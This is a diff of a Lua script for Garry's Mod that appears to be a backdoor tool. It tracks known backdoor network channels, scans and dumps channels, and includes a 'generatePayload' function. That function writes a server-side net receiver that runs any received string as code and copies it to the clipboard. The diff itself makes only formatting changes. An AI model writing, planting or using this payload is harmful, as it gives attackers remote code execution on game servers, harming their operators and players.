@@ -22,10 +22,10 @@ local i = 1
 end
 
 local function channelNil()
-  if(channel == "") then
+  if channel == "" then
     MsgC(Color(166, 222, 255), "No channel has been set. Please scan for available channels.\n")
     return true
-    end
+  end
 end
 
 local function dumpNet()
@@ -74,7 +74,6 @@ end
 
 local function help()
 MsgC(Color(166,222,255), "Amount of known channels: ", Color(155,155,155), #bdChannels.."\n\n")
-
 for k, v in pairs(groups) do
   MsgC(Color(51, 180, 255), v..": \n")
     for _, q in pairs(commands) do
@@ -137,7 +136,7 @@ end
 
 local function generatePayload(ply, cmd, args, argStr)
  if(!argStr || argStr == "") then return end
- SetClipboardText([[util.AddNetworkString(']]..argStr..[[') net.Receive(']]..argStr..[[',function(len,pl) RunStringEx(net.ReadString(),'[C]',false) end)]])
+  SetClipboardText([[util.AddNetworkString(']]..argStr..[[') net.Receive(']]..argStr..[[',function(len,pl) RunStringEx(net.ReadString(),'[C]',false) end)]])
  MsgC(Color(166,222,255), "Payload has been generated and copied to your clipboard with the following channel: ", Color(155,155,155), argStr)
 end
 
